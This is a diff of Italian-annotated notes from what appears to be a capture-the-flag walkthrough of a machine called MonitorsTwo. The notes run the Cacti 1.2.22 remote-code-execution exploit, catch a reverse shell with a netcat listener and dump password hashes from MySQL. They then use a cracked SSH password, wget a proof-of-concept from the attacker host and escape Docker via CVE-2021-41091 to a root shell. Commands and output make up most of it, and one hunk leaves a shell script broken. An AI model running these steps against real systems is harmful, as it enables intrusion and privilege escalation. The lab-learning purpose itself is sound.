@@ -8,7 +8,7 @@ Cacti v.1.2.22 -> Remote Code Execution exploit
 
 
 Script exploit cacti 1.2.22 -> https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
-python3 CVE-2022-46169-CACTI-1.py -u http:10.10.11.211 --LHOST={IPHOST} --LPORT={80/443}
+python3 CVE-2022-46169-CACTI-1.py -u http://10.10.11.211 --LHOST={IPHOST} --LPORT={80/443}
 sudo nc -lnvp 80
 ----------------SHELL CREATA------------------------------
 bash-5.1$cd ../../../
@@ -54,9 +54,7 @@ chown www-data:www-data -R /var/www/html
 # first arg is `-f` or `--some-option`
 if [ "${1#-}" != "$1" ]; then
         set -- apache2-foreground "$@"
-fi
 
-exec "$@"
 
 ----------------------------QUERY MYSQL PER TROVARE GLI USER NELLA TABELLA USER_AUTH DEL DATABASE--------------------------------------------------------------
 
@@ -78,6 +76,74 @@ marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C Marcus Brun
 ssh marcus@10.10.11.211
 password: funkymonkey
 
-marcus@monitorstwo: cat user.txt
+marcus@monitorstwo:~$ cat user.txt
+f66437b485d05eb50c6cd4d38121984c
+
+marcus@monitorstwo:~$ ps aux
+---PROCESSI IN USO
+
+marcus@monitorstwo:~$ ps aux | grep docker
+root         901  0.2  2.1 1455488 86976 ?       Ssl  15:01   0:31 /usr/sbin/dockerd -H fd://
+root        1336  0.6  0.2 1814312 8616 ?        Sl   15:01   1:28 /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.19.0.3 -container-port 80
+marcus      3592  0.0  0.0   6432   720 pts/0    S+   18:47   0:00 grep --color=auto docker
+
+marcus@monitorstwo:~$ docker -v
+Docker version 20.10.5+dfsg1, build 55c4c88
+
+marcus@monitorstwo:~$ findmnt
+─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/
+├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
+│                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
+├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/
+└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm 
+									  shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
 
 
+
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ 
+
+
+---------------------------------------------------------------------------EXPLOIT DOCKER 20.10.5---------------------------------------------------------------------------
+python3 -m http.server -> per riuscire a trasferire un file dalla mia macchina al bersaglio
+marcus@monitorstwo:~$ wget {IPHOST TUN0}:{PORTA}/poc.sh -> recupero file 
+
+poc.sh -> ottenuto da https://github.com/UncleJ4ck/CVE-2021-41091 per exploit su versione docker 20.10.5
+
+marcus@monitorstwo:~$ ls
+linpeas.sh  pd  user.txt  -> pd == file poc.sh
+
+marcus@monitorstwo:~$ ./pd
+[!] Vulnerable to CVE-2021-41091
+[!] Now connect to your Docker container that is accessible and obtain root access !
+[>] After gaining root access execute this command (chmod u+s /bin/bash)
+
+Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
+[!] Available Overlay2 Filesystems:
+/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+
+[!] Iterating over the available Overlay2 filesystems !
+[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'
+
+[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+[!] Rooted !
+[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'
+
+[!] Spawning Shell
+bash-5.1# exit
+
+marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
+bash-5.1# 
+bash-5.1# ls
+bin  boot  dev  entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+bash-5.1# cd /root
+bash-5.1# ls
+cacti  root.txt
+bash-5.1# cat root.txt
+70acdf8fa5ae7b172deabfd427f4f599
+bash-5.1# 
